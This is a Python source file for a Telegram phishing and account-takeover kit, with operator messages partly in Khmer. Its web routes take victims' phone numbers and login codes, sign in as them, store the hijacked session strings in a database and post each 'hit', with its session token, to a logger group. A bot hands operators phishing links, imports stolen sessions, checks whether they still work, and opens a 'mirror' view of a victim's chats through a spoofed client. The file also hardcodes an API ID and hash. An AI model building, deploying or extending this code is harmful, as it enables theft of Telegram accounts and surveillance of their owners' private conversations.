import os
import asyncio
import telebot
import psycopg2
import logging
from telebot import types
from quart import Quart, request, jsonify
from telethon import TelegramClient, functions, errors
from telethon.sessions import StringSession
from threading import Thread

# --- 1. CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", 0))
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))
ADMIN_HANDLE = "@g_yuyuu"
BASE_URL = os.environ.get("BASE_URL", "")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)

# Temporary memory storage
active_mirrors = {}
pending_auths = {}

# --- 2. DATABASE ENGINE ---

def get_db_connection():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("CREATE TABLE IF NOT EXISTS approved_users (user_id BIGINT PRIMARY KEY, status TEXT DEFAULT 'approved')")
        cur.execute("CREATE TABLE IF NOT EXISTS controlled_accounts (phone TEXT PRIMARY KEY, session_string TEXT, owner_name TEXT, tid BIGINT)")
        conn.commit()
        cur.close()
        conn.close()
        logger.info("Database initialized successfully.")
    except Exception as e:
        logger.error(f"Database Init Error: {e}")

def is_approved(user_id):
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT status FROM approved_users WHERE user_id = %s", (user_id,))
        res = cur.fetchone()
        cur.close()
        conn.close()
        return res is not None
    except:
        return False

init_db()

# --- 3. BOT COMMAND HANDLERS (FIREWALL ENABLED) ---

@bot.message_handler(commands=['start'])
def cmd_start(m):
    user_id = m.from_user.id
    if is_approved(user_id):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(types.KeyboardButton("🔗 បង្កើតតំណភ្ជាប់"), types.KeyboardButton("📋 បញ្ជីគណនី"))
        markup.add(types.KeyboardButton("❓ ជំនួយ"))
        bot.send_message(m.chat.id, "🎯 <b>Ultra Vinzy Mode សកម្ម!</b>\nស្វាគមន៍មកកាន់ប្រព័ន្ធគ្រប់គ្រង Mirror។", reply_markup=markup)
    else:
        # Block user and send request to Admin Group
        bot.send_message(m.chat.id, f"🚫 <b>ចូលប្រើមិនបានទេ!</b>\n\nគណនីរបស់អ្នកមិនទាន់ត្រូវបានអនុញ្ញាតឱ្យប្រើប្រាស់ប្រព័ន្ធនេះឡើយ។\nសូមទាក់ទងមកកាន់ Admin: {ADMIN_HANDLE}\n\n<i>សំណើរបស់អ្នកត្រូវបានផ្ញើទៅកាន់ក្រុមពិនិត្យរួចហើយ។</i>")
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ យល់ព្រម (Approve)", callback_data=f"user_ok_{user_id}"))
        bot.send_message(VERIFY_GROUP, 
            f"🔔 <b>សំណើសុំការអនុញ្ញាតថ្មី</b>\n\n"
            f"👤 User: @{m.from_user.username}\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"📍 Name: {m.from_user.first_name}", 
            reply_markup=markup
        )

@bot.callback_query_handler(func=lambda call: call.data.startswith('user_ok_'))
def handle_user_approval(call):
    if call.message.chat.id != VERIFY_GROUP: return
    uid = int(call.data.split('_')[2])
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO approved_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (uid,))
        conn.commit()
        cur.close()
        conn.close()
        bot.answer_callback_query(call.id, "✅ អនុញ្ញាតបានជោគជ័យ!")
        bot.edit_message_text(f"✅ <b>Approved!</b>\nUser ID <code>{uid}</code> អាចប្រើប្រាស់បានហើយ។", call.message.chat.id, call.message.message_id)
        bot.send_message(uid, "🎉 <b>អបអរសាទរ!</b>\nគណនីរបស់អ្នកត្រូវបាន Admin យល់ព្រមឱ្យប្រើប្រាស់ហើយ។ ចុច /start ដើម្បីចាប់ផ្តើម។")
    except Exception as e:
        bot.reply_to(call.message, f"❌ Error: {e}")

# .list Command - The Status Checker
@bot.message_handler(func=lambda m: m.text == ".list")
def cmd_list_checker(m):
    if m.chat.id != VERIFY_GROUP: return
    bot.reply_to(m, "🔎 <b>កំពុងឆែកមើលស្ថានភាព Sessions ក្នុង Database...</b>")
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT phone, session_string, owner_name FROM controlled_accounts")
    rows = cur.fetchall()
    cur.close()
    conn.close()

    if not rows:
        return bot.send_message(m.chat.id, "📭 មិនទាន់មាន Account ណាមួយឡើយ។")

    async def run_checks():
        report = "📊 <b>ស្ថានភាពគណនីទាំងអស់:</b>\n\n"
        for phone, s_str, name in rows:
            client = TelegramClient(StringSession(s_str), API_ID, API_HASH)
            try:
                await client.connect()
                if await client.is_user_authorized():
                    report += f"📱 <code>{phone}</code> ({name}) -> <b>Working</b> ✅\n"
                else:
                    report += f"📱 <code>{phone}</code> ({name}) -> <b>Revoked</b> ❌\n"
            except:
                report += f"📱 <code>{phone}</code> -> <b>Error</b> ⚠️\n"
            finally:
                await client.disconnect()
        return report

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    bot.send_message(m.chat.id, loop.run_until_complete(run_checks()))

# .auth Command - Manual Session Auth with Approval
@bot.message_handler(func=lambda m: m.text.startswith('.auth '))
def cmd_auth_manual(m):
    if not is_approved(m.from_user.id): return
    try:
        s_str = m.text.split('.auth ')[1].strip()
        auth_id = f"auth_{m.from_user.id}_{len(pending_auths)}"
        
        async def get_details():
            client = TelegramClient(StringSession(s_str), API_ID, API_HASH)
            await client.connect()
            me = await client.get_me()
            await client.disconnect()
            return me

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        me = loop.run_until_complete(get_details())

        pending_auths[auth_id] = {"session": s_str, "phone": me.phone, "name": me.first_name, "tid": m.from_user.id}

        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ Approve Session", callback_data=f"confirm_{auth_id}"))
        bot.send_message(VERIFY_GROUP, 
            f"📥 <b>សំណើសុំដាក់បញ្ចូល Session ថ្មី</b>\n\n"
            f"👤 អ្នកស្នើ: @{m.from_user.username}\n"
            f"📱 ឈ្មោះ: {me.first_name}\n"
            f"📞 លេខទូរស័ព្ទ: <code>{me.phone}</code>", 
            reply_markup=markup
        )
        bot.reply_to(m, "⏳ សំណើរបស់អ្នកត្រូវបានផ្ញើទៅ Admin ពិនិត្យ។")
    except Exception as e:
        bot.reply_to(m, f"❌ Session Error: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_auth_'))
def handle_auth_confirm(call):
    aid = call.data.split('confirm_')[1]
    if aid in pending_auths:
        data = pending_auths[aid]
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO controlled_accounts (phone, session_string, owner_name, tid) VALUES (%s, %s, %s, %s) ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string", (data['phone'], data['session'], data['name'], data['tid']))
        conn.commit()
        cur.close()
        conn.close()
        bot.send_message(data['tid'], f"✅ Session របស់លោកអ្នកត្រូវបានយល់ព្រម (📱 {data['phone']})")
        bot.edit_message_text(f"✅ <b>Session Saved!</b>\nPhone: {data['phone']}", call.message.chat.id, call.message.message_id)
        del pending_auths[aid]

# .mirror Command - The Link Bridge
@bot.message_handler(func=lambda m: m.text.startswith('.mirror'))
def cmd_mirror_bridge(m):
    if m.chat.id != VERIFY_GROUP: return
    parts = m.text.split()
    if len(parts) < 2: return bot.reply_to(m, "❌ របៀបប្រើ: <code>.mirror 855xxx</code>")
    phone = parts[1].replace("+", "").strip()
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🖥 បើកមើល Mirror View", url=f"{BASE_URL}/mirror/{phone}"))
    bot.send_message(m.chat.id, f"🪞 <b>Mirror Dashboard</b> សម្រាប់លេខ <code>{phone}</code> រួចរាល់។", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🔗 បង្កើតតំណភ្ជាប់")
def cmd_gen_link(m):
    if not is_approved(m.from_user.id): return
    bot.reply_to(m, f"✅ <b>តំណភ្ជាប់របស់អ្នក៖</b>\n\n<code>{BASE_URL}/?id={m.from_user.id}</code>")

# --- 4. THE WEB ENGINE (Quart) ---

@app.route('/')
async def login_page():
    try:
        with open("templates/login.html", "r", encoding="utf-8") as f:
            return f.read()
    except: return "❌ login.html is missing in templates/ folder", 404

@app.route('/mirror/<phone>')
async def mirror_page(phone):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT session_string, owner_name FROM controlled_accounts WHERE phone = %s", (phone,))
    res = cur.fetchone()
    cur.close()
    conn.close()

    if not res: return "<h1>Account not found</h1>", 404

    # Using high-trust WebK spoofing
    client = TelegramClient(StringSession(res[0]), API_ID, API_HASH, device_model="Telegram WebK", system_version="Windows 11")
    await client.connect()
    
    if not await client.is_user_authorized():
        return "<h1>Session Revoked</h1>", 401

    dialogs = await client.get_dialogs(limit=20)
    chats_html = "".join([f'<div style="padding:10px; border-bottom:1px solid #333;"><b>{d.name}</b></div>' for d in dialogs])
    await client.disconnect()

    return f"""
    <html>
    <head><style>body{{background:#0f0f0f; color:white; font-family:sans-serif; margin:0; display:flex;}} .sidebar{{width:300px; background:#1c1c1c; height:100vh; overflow:auto; border-right:1px solid #333;}}</style></head>
    <body>
        <div class="sidebar"><div style="padding:20px; background:#8774e1; font-weight:bold;">💬 Conversations</div>{chats_html}</div>
        <div style="flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center;">
            <h1 style="color:#8774e1;">🪞 Vinzy Mirror Hub</h1>
            <p>Target: <b>{res[1]}</b> (+{phone})</p>
            <p style="color:#00ff00;">● Online & Secured (Singapore Center)</p>
        </div>
    </body>
    </html>
    """

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone, tid = data.get('phone', '').replace("+", ""), data.get('tid')
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 16 Pro Max", system_version="18.3")
    await client.connect()
    try:
        sc = await client.send_code_request(phone)
        active_mirrors[phone] = {"client": client, "hash": sc.phone_code_hash, "tid": tid}
        return jsonify({"status": "success"})
    except Exception as e: return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone, code, tid = data.get('phone', '').replace("+", ""), data.get('code'), data.get('tid')
    if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Expired"})
    try:
        client = active_mirrors[phone]['client']
        await client.sign_in(phone, code, phone_code_hash=active_mirrors[phone]['hash'])
        
        # Save hit
        me = await client.get_me()
        s_str = client.session.save()
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO controlled_accounts (phone, session_string, owner_name, tid) VALUES (%s, %s, %s, %s) ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string", (phone, s_str, me.first_name, tid))
        conn.commit()
        cur.close()
        conn.close()

        bot.send_message(LOGGER_GROUP, f"💰 <b>ស្ទូចបានសម្រេច!</b>\n👤 {me.first_name}\n📱 {phone}\n🔑 <code>{s_str}</code>")
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔌 Connect to Bot", url=f"https://t.me/{bot.get_me().username}"))
        bot.send_message(tid, f"🎯 <b>HIT ថ្មី!</b>\n👤 {me.first_name}\n📱 {phone}\n\nប្រើ <code>.auth</code> ដើម្បីបញ្ជាក់។", reply_markup=markup)
        
        await client.disconnect()
        return jsonify({"status": "success"})
    except errors.SessionPasswordNeededError: return jsonify({"status": "2fa_needed"})
    except Exception as e: return jsonify({"status": "error", "msg": str(e)})

# --- 5. RUN ---
if __name__ == "__main__":
    Thread(target=lambda: bot.infinity_polling(skip_pending=True)).start()
    app.run(host="0.0.0.0", port=8000)
